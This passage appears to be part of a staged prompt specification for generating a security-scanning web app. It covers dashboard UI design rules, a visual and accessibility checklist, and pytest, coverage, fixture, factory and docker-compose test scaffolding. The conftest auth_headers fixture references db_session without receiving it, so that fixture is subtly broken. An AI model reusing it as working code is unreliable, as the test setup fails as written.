now themed.

─────────────────────────────────────────

LEFT COLUMN (70%):

TOP BAR:
  Target domain — font-mono text-3xl text-white
  Status: pulsing dot + status word in font-headline
    uppercase text-sm (RUNNING / PAUSED / COMPLETE)
    RUNNING dot: brand red, pulsing
    COMPLETE dot: low green, steady
  Pause / Cancel — ghost / danger buttons (danger uses
    the Anton-font Button variant defined in 13.4)

─────────────────────

PROGRESS HERO:

  Large circular ring (SVG, 200px):
    Track: white/6, Fill: brand red gradient
    Center: percentage in font-mono text-6xl
    Below ring: phase name, font-headline uppercase
      text-sm text-secondary
    Ring pulses gently (scale 1→1.02→1) while RUNNING

─────────────────────

TOOL TIMELINE:

  Horizontal strip, bg-surface, radius 8px
  Each tool block:
    COMPLETED: bg-brand/10, left border 2px brand
    RUNNING: bg-white/5, shimmer animation
    PENDING: transparent, dashed border white/10
    FAILED: bg-critical/10, left border 2px critical,
      AND wrapped in a single <ScanTear trigger={justFailed}>
      so a tool failing is the app "flinching" once
    Tool name: font-mono text-xs (tool names are technical
      strings like "subfinder" — keep them monospace, not
      shouted in headline caps)
    Duration: font-mono text-2xs text-muted

─────────────────────

CURRENT TOOL CARD:

  bg-elevated, border 1px brand/20, radius 8px
  Tool name: font-headline uppercase text-xl
  Elapsed time: font-mono text-secondary
  AI reason: font-sans text-sm text-secondary italic,
    one line truncated (the ONE place a full readable
    sentence matters most — AI reasoning must stay legible,
    never rendered in condensed caps)

─────────────────────

LIVE TERMINAL:

  bg-void, border 1px white/6, radius 8px, height 240px
  Every line font-mono text-xs (terminal output is
  ALWAYS monospace, non-negotiable, this is the one
  place font choice was never in question)
    [INFO]: text-secondary
    [FOUND]: text-brand
    [WARN]: text-medium
    [ERROR]: text-critical
  Auto-scrolls, new lines slide up (framer-motion)

─────────────────────────────────────────

RIGHT COLUMN (30%):

DISCOVERY COUNTERS: 4 compact cards, large font-mono
  number + font-headline uppercase text-2xs label

AI DECISIONS FEED:
  "AI DECISIONS" font-headline uppercase text-sm
  Each entry: bg-brand/5, left border 2px brand
    Decision text: font-sans text-sm (readable prose,
    not condensed caps — same rule as the tool-card
    AI reason above)
    Timestamp: font-mono text-2xs text-muted

FINDINGS FEED:
  "NEW FINDINGS" font-headline uppercase text-sm
  Each: severity square (not dot, per SeverityBadge pill
    spec) + title font-sans text-sm

  When a CRITICAL finding streams in via WebSocket:
    1. Mount <CriticalStrobe newCriticalFindingId={id} />
       scoped to this right column only
    2. Fire <ScanTear trigger={true}> once on that same
       column
    3. The new finding row itself gets the siege
       treatment: bg-siege-black, border white/20,
       title renders in font-emphasis (Anton) instead of
       font-sans, ONLY for that specific row, reverting
       to normal styling for every subsequent non-critical
       row added after it

─────────────────────────────────────────

SCAN COMPLETE STATE:

Replaces LEFT COLUMN entirely on scan_complete event.

  If total critical findings == 0:
    Standard celebration-adjacent treatment (restrained,
    not confetti-party — this app doesn't celebrate,
    it reports):
    Animated checkmark (draws itself, stroke-dashoffset),
      color: low green
    "SCAN COMPLETE" — font-headline uppercase text-5xl
    Risk score ring (same ring design, color per score)
    Findings summary row: font-mono numbers with
      font-headline uppercase labels beneath
    Buttons: "VIEW REPORT" (primary), "VIEW FINDINGS"
      (outline)
    A single subtle ember/spark burst using canvas-confetti
      configured with red/orange particles, low count
      (~30 particles), short duration (~800ms), gravity
      enabled so they fall and fade — this reads as
      "sparks from a breach test," not a party popper

  If total critical findings > 0:
    Full Blackout Siege takeover of the left column:
      bg-siege-black + useStaticLinesBackground() applied
      "BREACH CONFIRMED" — font-emphasis (Anton) text-6xl
        text-white, ONE single <CriticalStrobe> fires
        on this screen's mount
      Risk score ring in critical red only, no gradient
      Findings summary: critical count rendered largest,
        in font-emphasis, white-on-black; other severities
        below it in normal font-mono/font-headline styling
      Buttons: "VIEW REPORT" (primary), "VIEW FINDINGS"
        (danger variant, since findings need urgent review)
      NO ember burst, NO confetti — stillness is the tone
        here, not celebration of any kind

Generate LiveProgressDashboard.jsx only. Stop after.
```

---

### Step 13.8 — Vulnerability Dashboard

```
PHASE 13 — STEP 8

Generate: src/pages/findings/VulnerabilityDashboard.jsx

─────────────────────────────────────────

PAGE HEADER:
  "FINDINGS" font-headline uppercase text-4xl
  Count: font-mono text-4xl text-secondary
  Export button: outline, small, font-headline

─────────────────────────────────────────

SEVERITY ROW (5 cards):

  Each: bg-elevated, radius 6px, padding 24px/20px
  Number: font-mono text-5xl, colored per severity
  Label: font-headline uppercase text-2xs tracking-widest2

  The CRITICAL card specifically:
    If count > 0: full Blackout Siege card —
      bg-siege-black, border white/20, number in
      font-emphasis (Anton) not font-mono, white text
      with red text-shadow glow
    Click still applies filter same as any other card
    Active-filter state on this card: border becomes
      solid brand red instead of white/20

  Other 4 cards: standard tinted-on-click behavior as
    originally specified (severity-subtle bg + border)

─────────────────────────────────────────

FILTER BAR: unchanged structurally — ghost pill buttons,
  font-headline uppercase text-xs on each filter label,
  "CLEAR" reset in font-sans text-secondary (the one
  utility action that stays quiet/lowercase-feeling)

─────────────────────────────────────────

FINDINGS TABLE:

  th: font-headline uppercase text-2xs tracking-widest2
  Severity column: colored SQUARE (per updated
    SeverityBadge pill spec) not circle
  Title: font-sans text-sm (readable, not condensed —
    vulnerability titles are often long technical
    sentences, they must stay legible)
  OWASP/CVSS/Tool: font-mono text-xs, muted
  
  CRITICAL rows: left border 2px brand, and on first
    render of a NEWLY loaded critical finding (i.e., one
    that wasn't in the table on previous poll/websocket
    state), that row briefly gets .glitch-tear-once
    applied via the ScanTear pattern before settling into
    its normal (non-animated) siege-row styling

─────────────────────────────────────────

FINDING OVERLAY (slide-in from right, 640px):

  bg-surface, border-left 1px white/8

  IF finding.severity === 'CRITICAL':
    Apply .siege-surface + useStaticLinesBackground() to
    the entire overlay panel (bg becomes true black with
    the scattered static-line texture)
    Top severity bar: bg-siege-black, border-bottom 2px
      solid white (not brand — pure white line on black,
      per Blackout Siege's white/black-only rule for this
      one context)
    Severity word: font-emphasis (Anton) text-3xl, white
    Title: font-headline uppercase text-2xl (still
      headline font since it's a title, but NOT Anton —
      Anton is reserved for the single word "CRITICAL"
      itself, not the whole finding title, or the effect
      dilutes)
  
  ELSE (HIGH/MEDIUM/LOW/INFO):
    Standard bg-elevated treatment as originally specced,
    severity bar in the tinted severity color,
    title in font-headline uppercase text-2xl

  Metadata row (OWASP/CVE/CVSS/Tool tags): font-mono
    text-xs regardless of severity — data stays data

  TAB NAVIGATION: EVIDENCE | AI ANALYSIS | REMEDIATION
    Tab labels: font-headline uppercase text-sm
    Active: bottom border 2px brand

  EVIDENCE TAB:
    HTTP request/response blocks: bg-void, font-mono
      text-xs, unchanged from original spec — code stays
      code, no theatrics here
  
  AI ANALYSIS TAB:
    Business impact / technical detail: font-sans text
      (this must stay maximally readable — the app's one
      job here is clear communication of risk, not style)
  
  REMEDIATION TAB:
    Numbered steps: number in font-mono text-5xl text-muted,
      step text in font-sans text-sm (readable prose)

  FOOTER: "MARK AS FALSE POSITIVE" / "MARK FIXED" —
    font-headline uppercase text-sm links, brand color
    on hover

─────────────────────────────────────────

ATTACK CHAINS SECTION:

  bg-critical/5, border 1px critical/15, radius 10px
  Title: "⛓ ATTACK CHAINS" font-headline uppercase
    text-xl text-critical
  Chain flow diagram: boxes colored per finding severity,
    connecting lines, static (no animation) — chains are
    read carefully, they shouldn't move while being read
  Description below: font-sans text-sm text-secondary

Generate VulnerabilityDashboard.jsx only. Stop after.
```

---

### Step 13.9 — AI Dashboard

```
PHASE 13 — STEP 9

Generate: src/pages/ai/AIDashboard.jsx

─────────────────────────────────────────

PAGE HEADER:
  "AI ANALYSIS" font-headline uppercase text-4xl
  Scan selector: ghost dropdown, font-headline text-sm
  
  Stat line below: font-mono numbers + font-sans
    connective text (kept quiet/readable):
    "47 decisions · 12 tools selected · 3 chains found"

─────────────────────────────────────────

ATTACK PATH VISUALIZATION (3D, Three.js):

  Full width, 400px height, bg-surface, border white/8

  Node spheres: color by severity (using the app's
    severity palette, CRITICAL nodes = brand red)
    CRITICAL nodes: pulse scale 1→1.1→1, AND render
      with a thin white wireframe outline overlay
      (a subtle Blackout Siege nod inside the 3D scene
      itself — critical nodes look "different material"
      from the rest, not just a different color)
  
  Connecting lines: gradient between severities
  Node labels on hover: THREE.Sprite canvas text,
    rendered in a monospace font face for the canvas
    texture (technical label, not headline)
  
  Camera: OrbitControls, auto-rotate 0.005 rad/frame,
    pauses on interaction, resumes after 3s idle
  
  Background: pure black with sparse white star field
    (matches the void/siege palette, no blue-tinted
    space aesthetic — just black with white dust)
  
  Label: "ATTACK PATHS" top-left, font-headline
    uppercase text-xs tracking-widest2 text-muted

─────────────────────────────────────────

SPLIT LAYOUT:

LEFT (55%) — DECISION TIMELINE:
  "DECISIONS" font-headline uppercase text-xl
  
  Each entry: bg-elevated, radius 8px
    Phase badge: font-headline uppercase text-2xs
      tracking-widest2, text-muted, colored per phase
      (RECON: brand-subtle text, VULN: high, EXPLOIT:
      critical, STRIX: a distinct violet — the one
      non-palette color allowed, reserved exclusively
      for marking "this came from the autonomous agent"
      so it's always instantly distinguishable: #8B5CF6)
    Decision text: font-sans text-base (readable prose,
      never condensed caps — this is literally the app
      explaining its reasoning to a human, must be clear)
    Reason: font-sans text-sm text-secondary
    Tools row: font-mono text-xs, brand-colored, comma-sep
    Timestamp: font-mono text-2xs text-muted

RIGHT (45%) — FINDING DETAIL PANEL:
  Sticky, bg-elevated, radius 10px
  Default: "CLICK A NODE IN THE ATTACK MAP" font-headline
    uppercase text-sm text-secondary, centered
  Selected state:
    Finding title: font-headline uppercase text-2xl
    Severity: colored square + name, font-sans
    CVSS: font-mono text-4xl
    Business impact: font-sans text-sm (readable)
    "VIEW FULL FINDING →" font-headline text-brand text-sm

─────────────────────────────────────────

BOTTOM: AI PERFORMANCE STATS (single row, no cards):

  4 numbers, font-mono text-5xl, separated by 1px
    vertical white/6 lines
  Labels beneath: font-headline uppercase text-sm
    text-muted tracking-wide

  "0.87" AVG CONFIDENCE
  "3" CHAINS DETECTED
  "12" FALLBACKS TRIGGERED
  "4" FALSE POSITIVES CAUGHT

Generate AIDashboard.jsx only. Stop after.
```

---

### Step 13.10 — Reports Dashboard

```
PHASE 13 — STEP 10

Generate: src/pages/reports/ReportsDashboard.jsx

─────────────────────────────────────────

REPORTS LIST:

PAGE HEADER: "REPORTS" font-headline uppercase text-4xl

REPORT CARDS (grid, 2 col desktop):
  bg-elevated, radius 8px, border white/8, padding 28px
  Hover: border white/16, lift 2px

  Target: font-mono text-xl text-primary
  Date: font-sans text-secondary text-sm

  Risk score ring (80px SVG) + breakdown:
    "4 CRITICAL · 12 HIGH · 8 MEDIUM" — this line mixes
    font-mono numbers with font-headline uppercase
    severity words, colored dots before each

  Scan mode badge: font-headline uppercase text-2xs,
    colored dot (CLASSIC=muted, HYBRID=violet-tinted,
    AUTONOMOUS=full brand red — the "boldest" mode gets
    the boldest color)

  "DOWNLOAD PDF" — font-headline text-brand text-sm

  If the report contains ANY critical finding: card gets
    a 1px brand-red border by default (not just on hover)
    so critical reports are visually distinguishable in
    the grid at a glance without opening them

─────────────────────────────────────────

REPORT VIEWER:

LEFT NAV PANEL (320px, sticky):
  bg-surface, border-right white/6
  Report title: font-headline uppercase text-base
  Nav sections: font-headline uppercase text-sm
    text-secondary, active = text-primary + left border
    2px brand
  Bottom: "DOWNLOAD PDF" full-width primary button

RIGHT CONTENT (max-width 820px):

  EXECUTIVE SUMMARY:
    Risk gauge: semicircle arc, needle, font-mono text-5xl
      score, "OVERALL RISK" label font-headline uppercase
      text-xs, rating word below in font-headline uppercase
      text-2xl (colored per severity ramp)
    
    Findings row: 4 numbers (font-mono text-5xl, colored)
      with font-headline uppercase text-2xs labels beneath
    
    Executive text: font-sans text-base text-secondary
      leading-relaxed, plain paragraph — this is the ONE
      long-form readable passage in the entire report,
      deliberately never rendered in condensed caps or
      monospace, because a decision-maker needs to
      actually read and absorb it

  FINDINGS:
    Each: left severity stripe (8px), bg-elevated card
    Title: font-headline uppercase text-lg
    URL: font-mono text-secondary text-sm truncated
    Tags: font-mono text-xs, muted, · separated
    Business impact: font-sans text-sm (readable prose)
    Remediation: numbered, font-sans text-sm
    
    CRITICAL findings specifically: card switches to
      bg-siege-black + white border 1px, title renders
      in font-emphasis instead of font-headline, severity
      stripe becomes solid white instead of colored red
      (red would blend into the black-card context, white
      reads as the "alarm" color inside a black card)
    
    If is_ai_validated: small violet dot (the same
      Strix-specific violet from the AI Dashboard) top
      right of card, tooltip "Validated by autonomous agent"

  ATTACK PATH:
    Narrative: font-sans text-base text-secondary
    Static SVG chain diagram (boxes + arrows, no animation)

  REMEDIATION PLAN:
    Tier 1 (Immediate): left bar in critical red,
      "TIER 1 — IMMEDIATE" font-headline uppercase text-sm,
      actions in font-sans text-sm
    Tier 2: left bar high orange
    Tier 3: left bar muted gray
    No background blocks, bar + text only

  STATISTICS:
    Label (font-sans text-secondary) / Value (font-mono
    text-primary), two-column rows, thin border-bottom

Generate ReportsDashboard.jsx only. Stop after.
```

---

### Step 13.11 — Phase 13 Verification

```
PHASE 13 — STEP 11 — FINAL VERIFICATION

Run: npm run dev in frontend/

─── LOGIN / REGISTER ─────────────────────

□ Matrix rain visible behind text, barely-there (~5.5%
  opacity), not distracting from readable text
□ Rain uses brand red glyphs with brighter "head" glyph
□ ScanTear glitch fires once on page mount, then stops
□ Headlines in Oswald, all-caps, condensed
□ The ONE quiet sans-serif tagline is visibly different
  in weight/case from the shouting headline above it
□ Password strength bar uses severity-ramp colors
□ Submit button says "CONTINUE" in Oswald caps

─── USER DASHBOARD ───────────────────────

□ Sparse matrix rain texture behind hero, very subtle
□ 4 stat cards, numbers in IBM Plex Mono
□ CRITICAL card: if count > 0, flips to Blackout Siege
  (black bg, white Anton number, single strobe fired once)
□ Non-critical cards never use Anton or siege styling
□ No tips/recommendations widgets present

─── LIVE PROGRESS ────────────────────────

□ Progress ring animates in brand red
□ Tool timeline: failed tool triggers ScanTear once
□ Terminal log strictly monospace, color-coded by level
□ New CRITICAL finding in feed: triggers CriticalStrobe
  (max 150ms, max 12% opacity) + one ScanTear + that
  specific row renders in Anton/siege styling
□ Strobe does NOT repeat for the same finding ID
□ Scan complete, 0 criticals: green checkmark, ember
  burst (red/orange particles, NOT confetti-colored)
□ Scan complete, has criticals: full black/white Siege
  takeover, "BREACH CONFIRMED" in Anton, one strobe fires,
  no ember burst

─── VULNERABILITY DASHBOARD ──────────────

□ CRITICAL severity card uses Siege treatment when count>0
□ Newly-arrived critical table row briefly glitch-tears
  then settles into static siege-row styling (no ongoing
  animation on old critical rows)
□ Finding overlay for a CRITICAL finding: black bg, white
  severity bar, Anton "CRITICAL" word, static-lines texture
  visible faintly in the background
□ Finding overlay for non-critical: standard elevated card,
  colored severity bar, no siege elements
□ Evidence/remediation text stays fully readable (Inter),
  never rendered in condensed or Anton fonts

─── AI DASHBOARD ─────────────────────────

□ 3D graph renders, CRITICAL nodes have white wireframe
  outline in addition to red fill + pulse
□ Strix-sourced decisions show the distinct violet phase
  badge, visually separable from red/orange/critical tags
□ Decision text and reason stay in readable Inter font

─── REPORTS DASHBOARD ────────────────────

□ Report cards containing a critical finding show a
  persistent (non-hover) red border
□ AUTONOMOUS scan-mode badge uses the boldest brand red;
  HYBRID uses violet; CLASSIC uses muted gray
□ In-report critical findings: black card, white title,
  white severity stripe (not red)
□ Executive summary paragraph is in plain Inter prose,
  never in headline/condensed casing

─── ACCESSIBILITY (CRITICAL TO VERIFY) ───

□ prefers-reduced-motion disables: matrix rain, ScanTear,
  CriticalStrobe, shimmer — verify via OS-level setting
  or DevTools > Rendering > Emulate CSS media feature
□ CriticalStrobe never exceeds 0.12 peak opacity
  (check via DevTools performance/paint flashing, or by
  reading the animate() call directly in code)
□ CriticalStrobe fires exactly once per unique finding ID
  — trigger the same critical finding event twice in dev
  tools and confirm no second flash occurs
□ No effect anywhere loops faster than 3 times/second
□ Color is never the ONLY signal — every severity also
  carries a text label (CRITICAL/HIGH/etc.), verified in
  both pill and large SeverityBadge variants
□ Focus rings visible on all interactive elements
□ All icon-only buttons have aria-label

─── PERFORMANCE ──────────────────────────

□ Matrix rain (Three.js) capped at 30fps internally,
  pauses when tab is not visible (check via
  document.visibilityState + Performance tab)
□ Lighthouse Performance score ≥ 85
□ No layout shift from any effect triggering
□ Bundle size acceptable (<2MB, Three.js dominant chunk)

─────────────────────────────────────────

Run build check:
  npm run build
  Expected: builds clean, no missing font imports,
  no unused-effect warnings

─────────────────────────────────────────

Phase 13 complete when:
  □ All visual checklist items pass
  □ CriticalStrobe verified WCAG-safe (single-shot,
    ≤0.12 opacity, ≤300ms total)
  □ prefers-reduced-motion fully disables all four
    signature effects with zero visual regression to
    the rest of the app's usability
  □ Build succeeds, 60fps maintained outside the Three.js
    rain layer (which is intentionally capped at 30fps)
```

---

## Phase 13 Summary

| Component | Design Decision | Why |
|---|---|---|
| Color | Pure crimson (#E10600) as the only accent, true black base | Red means exactly one thing everywhere — never diluted |
| Headline font | Oswald, all-caps, condensed | Industrial, alarm-console voice for structure |
| Emphasis font | Anton, reserved for CRITICAL only | Makes "critical" feel like a different register, not just a color swap |
| Body font | Inter, the one quiet font | Every place a human must actually read comfortably stays legible |
| Data font | IBM Plex Mono | Numbers, code, IDs — consistent technical voice |
| Matrix rain | Auth + dashboard hero only, ≤5.5% opacity | Texture, not decoration — never touches data screens |
| ScanTear glitch | One-shot, rare, meaningful triggers | The screen "flinches" instead of celebrating |
| CriticalStrobe | Exactly-once, ≤0.12 opacity, ≤300ms | WCAG-safe signal, not a seizure risk |
| Blackout Siege | Reserved entirely for CRITICAL context | The app's loudest visual state, used exactly once per moment it matters |
| Everything else | Restrained, quiet, data-first | Contrast makes the loud moments actually land |

**The rule for this system specifically: the app is silent until something is critical — then, and only then, it is allowed to shout, exactly once.**


# PHASE 14 — TESTING + QA

---

### Step 14.0 — Phase 14 Master Context

```
PHASE 14 — TESTING + QA

Phases 0-13 complete. Full platform built and designed.
Now building the comprehensive test suite covering
every component from database models to the UI.

What this phase builds:
  A. Test infrastructure (conftest, factories, fixtures)
  B. Unit tests (models, plugins, validators, normalizers)
  C. Integration tests (agent pipeline end-to-end)
  D. API endpoint tests (all 40+ routes)
  E. Security self-tests (test the tester)
  F. Strix integration tests (gated, mock-based)
  G. Frontend component tests (Vitest + RTL)
  H. Performance benchmarks
  I. CI/CD pipeline (GitHub Actions)

Test targets for live tests (legal only):
  scanme.nmap.org (Nmap's own target)
  docker run -d -p 8080:80 vulnerables/web-dvwa
  docker run -d -p 3000:3000 bkimminich/juice-shop

Coverage target: 85% backend, 75% frontend

Tools:
  pytest + pytest-asyncio + pytest-cov
  factory-boy (test data)
  respx (mock httpx)
  fakeredis (mock Redis)
  Vitest + React Testing Library
  Playwright (E2E browser tests)

Architecture rules:
  - All tests run via: docker compose -f
    docker-compose.test.yml up
  - No test depends on external internet UNLESS
    marked @pytest.mark.live
  - All Celery tasks run in ALWAYS_EAGER mode
  - All Redis uses fakeredis in unit tests
  - Live tests: manual only, never in CI
  - Coverage report: HTML at coverage_report/index.html

Token rule:
Generate in order, wait for "next" between each:
  Step 14.1: Test config + infrastructure
  Step 14.2: Model + database tests
  Step 14.3: Plugin system tests
  Step 14.4: Agent pipeline tests
  Step 14.5: API endpoint tests
  Step 14.6: Security self-tests
  Step 14.7: Strix-specific tests
  Step 14.8: Frontend tests
  Step 14.9: Performance tests
  Step 14.10: CI/CD pipeline
  Step 14.11: Final verification
```

---

### Step 14.1 — Test Infrastructure

```
PHASE 14 — STEP 1

Generate these files:
  tests/conftest.py
  tests/factories.py
  tests/__init__.py
  pytest.ini
  .coveragerc
  docker-compose.test.yml

─────────────────────────────────────────

pytest.ini:

[pytest]
asyncio_mode = auto
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*
addopts =
  -v
  --tb=short
  --cov=backend
  --cov-report=term-missing
  --cov-report=html:coverage_report
  --cov-fail-under=85
markers =
  unit: Fast unit tests, no I/O, no DB
  integration: Integration tests needing DB + Redis
  api: FastAPI endpoint tests
  agent: Agent pipeline integration tests
  security: Security self-tests against our own API
  strix: Strix agent specific tests
  frontend: Frontend component tests
  e2e: End-to-end browser tests via Playwright
  live: Real tool execution against legal targets
  slow: Tests taking more than 10 seconds
filterwarnings =
  ignore::DeprecationWarning
  ignore::PendingDeprecationWarning

─────────────────────────────────────────

.coveragerc:

[run]
source = backend
omit =
  backend/main.py
  backend/__init__.py
  backend/config/__init__.py
  backend/models/__init__.py
  backend/api/__init__.py
  backend/workers/__init__.py
  backend/plugins/__init__.py
  */alembic/versions/*
  */tests/*
  */migrations/*
  */__pycache__/*

[report]
exclude_lines =
  pragma: no cover
  def __repr__
  def __str__
  raise NotImplementedError
  if __name__ == .__main__.:
  pass
  \.\.\.
  TYPE_CHECKING

[html]
directory = coverage_report
title = AgentSec AI Coverage Report

─────────────────────────────────────────

tests/conftest.py:

import asyncio, json, pytest, httpx
from uuid import uuid4, UUID
from datetime import datetime, timedelta
from typing import AsyncGenerator
from unittest.mock import AsyncMock, MagicMock, patch

from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import (
  create_async_engine, AsyncSession, async_sessionmaker
)
from fakeredis import aioredis as fake_aioredis

# ── Event loop ─────────────────────────────────────────

@pytest.fixture(scope="session")
def event_loop():
  loop = asyncio.new_event_loop()
  yield loop
  loop.close()

# ── Database ───────────────────────────────────────────

@pytest.fixture(scope="session")
async def test_engine():
  engine = create_async_engine(
    "sqlite+aiosqlite:///:memory:",
    echo=False
  )
  async with engine.begin() as conn:
    from backend.models.base import Base
    await conn.run_sync(Base.metadata.create_all)
  yield engine
  await engine.dispose()

@pytest.fixture
async def db_session(test_engine) -> AsyncGenerator[AsyncSession, None]:
  async_session = async_sessionmaker(
    test_engine, expire_on_commit=False
  )
  async with async_session() as session:
    yield session
    await session.rollback()

# ── Redis ──────────────────────────────────────────────

@pytest.fixture
async def fake_redis():
  redis = fake_aioredis.FakeRedis()
  yield redis
  await redis.flushall()
  await redis.aclose()

# ── Celery (always eager in tests) ────────────────────

@pytest.fixture(autouse=True)
def mock_celery_eager(monkeypatch):
  from backend.workers.celery_app import celery_app
  celery_app.conf.task_always_eager = True
  celery_app.conf.task_eager_propagates = True
  yield
  celery_app.conf.task_always_eager = False

# ── API client ─────────────────────────────────────────

@pytest.fixture
def api_client(db_session, fake_redis):
  from backend.main import app
  from backend.config.database import get_db
  from backend.config.redis import get_redis

  async def override_db():
    yield db_session

  async def override_redis():
    return fake_redis

  app.dependency_overrides[get_db] = override_db
  app.dependency_overrides[get_redis] = override_redis

  with TestClient(app, raise_server_exceptions=True) as client:
    yield client

  app.dependency_overrides.clear()

# ── Auth helpers ───────────────────────────────────────

@pytest.fixture
async def auth_headers(api_client):
  from backend.utils.security import get_password_hash
  from backend.models.user import User
  
  user = User(
    email="test@agentsec.ai",
    username="testuser",
    hashed_password=get_password_hash("TestPass123!"),
    is_active=True,
    role="ANALYST"
  )
  db_session.add(user)
  await db_session.commit()
  
  response = api_client.post("/api/v1/auth/login", json={
    "email": "test@agentsec.ai",
    "password": "TestPass123!"
  })
  token = response.json()["data"]["access_token"]
  return {"Authorization": f"Bearer {token}"}

@pytest.fixture
async def admin_headers(api_client, db_session):
  from backend.utils.security import get_password_hash
  from backend.models.user import User
  
  user = User(
    email="admin@agentsec.ai",
    username="adminuser",
    hashed_password=get_password_hash("AdminPass123!"),
    is_active=True,
    is_superuser=True,
    role="ADMIN"
  )
  db_session.add(user)
  await db_session.commit()
  
  response = api_client.post("/api/v1/auth/login", json={
    "email": "admin@agentsec.ai",
    "password": "AdminPass123!"
  })
  token = response.json()["data"]["access_token"]
  return {"Authorization": f"Bearer {token}"}

# ── Plugin mock ────────────────────────────────────────

@pytest.fixture
def mock_executor():
  from backend.plugins.base_plugin import PluginOutput
  
  executor = AsyncMock()
  executor.run.return_value = PluginOutput(
    scan_id="test-scan-001",
    plugin_name="subfinder",
    success=True,
    raw_output='{"host":"api.example.com","source":["subfinder"]}',
    parsed_data=[{
      "subdomain": "api.example.com",
      "source": ["subfinder"],
      "tool": "subfinder"
    }],
    record_count=1,
    execution_time=2.5,
    error_message=None,
    command_executed="subfinder -d example.com -json",
    quality_score=0.9
  )
  return executor

# ── Claude API mock ────────────────────────────────────

@pytest.fixture
def mock_claude_api(respx_mock):
  respx_mock.post("https://api.anthropic.com/v1/messages").mock(
    return_value=httpx.Response(200, json={
      "content": [{
        "type": "text",
        "text": json.dumps({
          "business_impact": "Attackers could exploit this to gain unauthorized access.",
          "technical_explanation": "The vulnerability exists due to insufficient input validation.",
          "remediation_steps": [
            "Update the affected library to the latest version.",
            "Implement input validation on all user-supplied data.",
            "Add WAF rules to detect exploitation attempts."
          ]
        })
      }]
    })
  )
  yield respx_mock

# ── Scan fixture ───────────────────────────────────────

@pytest.fixture
async def sample_scan(db_session, auth_headers):
  from tests.factories import ScanFactory
  scan = await ScanFactory.create(
    target="scanme.nmap.org",
    status="PENDING",
    scan_type="FULL"
  )
  return scan

@pytest.fixture
async def completed_scan(db_session, sample_scan):
  from tests.factories import FindingFactory
  sample_scan.status = "COMPLETED"
  sample_scan.progress = 100
  sample_scan.completed_at = datetime.utcnow()
  
  await FindingFactory.create_batch(
    5, scan_id=sample_scan.id,
    severity="HIGH"
  )
  await FindingFactory.create_batch(
    2, scan_id=sample_scan.id,
    severity="CRITICAL"
  )
  await db_session.commit()
  return sample_scan

─────────────────────────────────────────

tests/factories.py:

import factory
from factory.alchemy import SQLAlchemyModelFactory
from uuid import uuid4
from datetime import datetime

from backend.models.organization import Organization
from backend.models.user import User
from backend.models.scan import Scan
from backend.models.finding import Finding
from backend.models.subdomain import Subdomain
from backend.models.host import Host
from backend.models.port import Port
from backend.models.endpoint import Endpoint
from backend.models.technology import Technology

class OrganizationFactory(SQLAlchemyModelFactory):
  class Meta:
    model = Organization
  
  id = factory.LazyFunction(uuid4)
  name = factory.Faker("company")
  slug = factory.Sequence(lambda n: f"org-{n}")
  is_active = True
  plan = "FREE"
  max_scans = 10
  authorized_scope_confirmed = False
  created_at = factory.LazyFunction(datetime.utcnow)
  updated_at = factory.LazyFunction(datetime.utcnow)

class UserFactory(SQLAlchemyModelFactory):
  class Meta:
    model = User
  
  id = factory.LazyFunction(uuid4)
  email = factory.Sequence(lambda n: f"user{n}@test.com")
  username = factory.Sequence(lambda n: f"user_{n}")
  hashed_password = "$2b$12$test_hash_placeholder"
  is_active = True
  is_superuser = False
  role = "ANALYST"
  scan_quota = 10
  created_at = factory.LazyFunction(datetime.utcnow)

class ScanFactory(SQLAlchemyModelFactory):
  class Meta:
    model = Scan
  
  id = factory.LazyFunction(uuid4)
  target = "example.com"
  scan_type = "FULL"
  scan_mode = "CLASSIC"
  status = "PENDING"
  progress = 0
  total_assets = 0
  total_findings = 0
  risk_score = None
  strix_cost_usd = None
  created_at = factory.LazyFunction(datetime.utcnow)

class FindingFactory(SQLAlchemyModelFactory):
  class Meta:
    model = Finding
  
  id = factory.LazyFunction(uuid4)
  title = factory.Faker("sentence", nb_words=5)
  description = factory.Faker("paragraph")
  severity = factory.Iterator(["CRITICAL","HIGH","MEDIUM","LOW","INFO"])
  cvss_score = factory.Faker("pyfloat", min_value=1.0, max_value=10.0)
  affected_url = factory.Faker("url")
  is_false_positive = False
  is_confirmed = False
  tool_found_by = factory.Iterator(["nuclei","sqlmap","dalfox","strix"])
  owasp_category = "A02:2025"
  status = "NEW"
  created_at = factory.LazyFunction(datetime.utcnow)

class SubdomainFactory(SQLAlchemyModelFactory):
  class Meta:
    model = Subdomain
  
  id = factory.LazyFunction(uuid4)
  name = factory.Sequence(lambda n: f"sub{n}.example.com")
  is_alive = True
  http_status = 200
  state = "DISCOVERED"
  source = "subfinder"
  created_at = factory.LazyFunction(datetime.utcnow)

─────────────────────────────────────────

docker-compose.test.yml:

version: "3.9"
services:

  test_postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: test
      POSTGRES_PASSWORD: test
      POSTGRES_DB: agentsec_test
    ports:
      - "5433:5432"
    tmpfs:
      - /var/lib/postgresql/data

  test_redis:
    image: redis:7-alpine
    ports:
      - "6380:6379"

  test_runner:
    build:
      context: .
      dockerfile: docker/Dockerfile.backend
    depends_on:
      - test_postgres
      - test_redis
    environment:
      DATABASE_URL: postgresql+asyncpg://test:test@test_postgres:5432/agentsec_test
      REDIS_URL: redis://test_redis:6379/0
      CELERY_BROKER_URL: redis://test_redis:6379/0
      CELERY_RESULT_BACKEND: redis://test_redis:6379/0
      APP_ENV: testing
      APP_DEBUG: "True"
      SECRET_KEY: "test-secret-64-chars-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      JWT_SECRET_KEY: "test-jwt-64-chars-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      ANTHROPIC_API_KEY: "test-key-not-real"
      STRIX_AGENT_ENABLED: "False"
      EXPLOIT_AGENT_ENABLED: "False"
    command: >
      pytest tests/ -m "not live" -v
        --cov=backend
        --cov-report=xml:coverage.xml
        --cov-fail-under=85
    volumes:
      - ./backend:/app/backend
      - ./tests:/app/tests

Generate all files. Stop after.
```

---

### Step 14.2 — Model + Database Tests

```
PHASE 14 — STEP 2

Generate: tests/test_models.py

All tests are @pytest.mark.unit unless noted.

─────────────────────────────────────────

class TestScanModel:

test_scan_defaults():
  scan = Scan(target="example.com")
  Assert: scan.status == "PENDING"
  Assert: scan.progress == 0
  Assert: scan.scan_mode == "CLASSIC"
  Assert: scan.total_findings == 0
  Assert: scan.strix_cost_usd is None

test_scan_status_valid_values():
